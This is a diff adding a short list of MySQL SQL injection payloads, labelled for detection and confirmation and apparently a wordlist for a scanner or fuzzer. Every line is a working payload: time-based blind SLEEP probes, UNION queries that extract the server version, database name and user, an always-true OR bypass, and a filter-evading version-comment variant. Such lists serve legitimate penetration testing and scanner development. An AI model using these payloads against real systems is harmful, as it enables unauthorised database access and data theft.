@@ -1,0 +1,9 @@
+# MySQL-specific detection / confirmation
+1' AND SLEEP(2)-- -
+1" AND SLEEP(2)-- -
+1 AND IF(1=1,SLEEP(2),0)-- -
+1 AND IF(1=2,SLEEP(2),0)-- -
+1 UNION SELECT @@version,NULL-- -
+1 UNION SELECT database(),user()-- -
+1'/**/OR/**/'1'='1'-- -
+1/*!50000UNION*//*!50000SELECT*/NULL,NULL-- -
